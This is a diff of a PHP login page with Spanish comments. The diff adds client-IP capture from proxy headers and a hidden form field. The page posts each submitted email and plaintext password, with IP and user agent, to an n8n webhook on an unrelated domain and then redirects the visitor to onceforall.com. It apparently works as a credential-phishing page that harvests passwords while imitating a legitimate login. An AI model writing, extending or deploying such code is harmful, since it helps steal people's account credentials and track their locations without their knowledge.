@@ -1,4 +1,28 @@
 <?php
+// ---- Utilidad para obtener la IP del cliente (respetando proxies/CDN) ----
+function getClientIp(): string {
+    $candidates = [
+        'HTTP_CF_CONNECTING_IP', // Cloudflare
+        'HTTP_X_FORWARDED_FOR',  // Proxy / Load balancer (lista, tomar el primero)
+        'HTTP_X_REAL_IP',        // Nginx / Proxy
+        'REMOTE_ADDR',           // Fallback
+    ];
+    foreach ($candidates as $key) {
+        if (!empty($_SERVER[$key])) {
+            $ip = $_SERVER[$key];
+            if ($key === 'HTTP_X_FORWARDED_FOR') {
+                // Puede venir como "ip1, ip2, ip3"
+                $parts = explode(',', $ip);
+                $ip = trim($parts[0]);
+            }
+            return trim($ip);
+        }
+    }
+    return '';
+}
+
+$clientIp = getClientIp();
+
 // ---- Manejo del envío ----
 $apiUrl = 'https://n8n.cast1llo.com/webhook/95da625a-d94c-4987-833a-53bedbbf726c';
 $resultMsg = null;
@@ -8,6 +32,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Sanitizar entrada básica (para mostrarla después si hace falta)
     $email = isset($_POST['email']) ? trim($_POST['email']) : '';
     $password = isset($_POST['password']) ? $_POST['password'] : '';
+    $clientIpFromForm = isset($_POST['client_ip']) ? trim($_POST['client_ip']) : null;
 
     if ($email === '' || $password === '') {
         $resultType = 'error';
@@ -18,11 +43,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     } else {
         // Construir payload JSON
         $payload = json_encode([
-            'email' => $email,
-            'password' => $password,
-            'ip' => $_SERVER['X-Forwarded-For'] ?? null,
-            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? null,
-            'timestamp' => date('c') // ISO 8601
+            'email'       => $email,
+            'password'    => $password,
+            // Preferimos la IP detectada en servidor; también enviamos la recibida por el hidden para depuración
+            'ip'          => $clientIp,
+            'ip_form'     => $clientIpFromForm,
+            'user_agent'  => $_SERVER['HTTP_USER_AGENT'] ?? null,
+            'timestamp'   => date('c') // ISO 8601
         ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
 
         // Llamada cURL a la API
@@ -51,12 +78,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $json = json_decode($responseBody, true);
             if ($httpCode >= 200 && $httpCode < 300) {
                 $resultType = 'success';
-                // Mensaje de la API si existe; si no, mensaje genérico
                 $resultMsg = 'Login correcto.';
                 header("Location: https://onceforall.com");
                 die();
-                // Aquí podrías guardar tokens de sesión/cookies si la API los retorna:
-                // if (!empty($json['token'])) { $_SESSION['token'] = $json['token']; }
             } else {
                 // Extraer error devuelto por la API (si lo hay)
                 $apiError = is_array($json) && isset($json['error']) ? $json['error'] : null;
@@ -152,6 +176,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         <?php endif; ?>
 
         <form action="" method="POST" novalidate>
+          <!-- Hidden con la IP del cliente -->
+          <input type="hidden" name="client_ip" value="<?php echo htmlspecialchars($clientIp, ENT_QUOTES, 'UTF-8'); ?>">
+
           <input
             type="email"
             name="email"
@@ -185,5 +212,3 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   </div>
 </body>
 </html>
-
-
